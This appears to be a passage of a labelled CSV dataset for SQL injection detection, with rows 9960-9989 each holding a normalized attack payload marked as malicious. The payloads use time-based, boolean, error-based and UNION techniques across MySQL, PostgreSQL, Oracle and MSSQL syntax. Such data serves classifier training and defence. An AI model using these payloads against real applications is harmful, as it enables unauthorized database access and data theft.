row_index,payload_norm,label,sqli_type_hint
9960,"select pg_sleep ( 5 ) and ( ( ""qani"" = ""qani",1,
9961,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ""soyg"" = ""soyg",1,
9962,-5113' ) ) ) or 7200 = 3094--,1,
9963,"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 2966,2966 ) --",1,
9964,1'|| ( select 'pcps' from dual where 7255 = 7255 and 7121 = 4603,1,
9965,1 ) where 6116 = 6116 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
9966,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
9967,1' ) where 3187 = 3187 order by 1#,1,
9968,"1%' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",1,
9969,"-5757%"" ) or 6872 = 6872 and ( ""%"" = """,1,
9970,"1"" or sleep ( 5 ) and ""fbuo"" like ""fbuo",1,
9971,"1' ) ) as kfnt where 8090 = 8090 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
9972,-2992' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 'tjgt' = 'tjgt,1,
9973,"-3219"" ) order by 1--",1,
9974,"1"" ) ) ) or sleep ( 5 ) #",1,
9975,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
9976,"( select ( case when ( 1343 = 1343 ) then ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) else 1343 end ) from dual )",1,
9977,-6190' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
9978,"1' ) ) as ezpq where 2976 = 2976 union all select null,null,null,null,null,null,null,null,null,null#",1,
9979,"1'|| ( select 'zqdn' where 6194 = 6194 union all select null,null,null,null--",1,
9980,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""acbq"" like ""acbq",1,
9981,1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'ltki' = 'ltki,1,
9982,"1' ) as ezoa where 4915 = 4915 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
9983,-8878' in boolean mode ) union all select 7785#,1,
9984,1' ) ) and ( 7517 = 3423 ) *3423 and ( ( 'aenz' = 'aenz,1,
9985,-2797' ) ) ) union all select 5711#,1,
9986,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 2303 = 2303",1,
9987,1' ) and ( 3020 = 3020 ) *6703 and ( 'botl' like 'botl,1,
9988,"iif ( 9875 = 8961,1,1/0 )",1,
9989,"-7843' where 5986 = 5986 or make_set ( 9354 = 9354,7185 ) --",1,
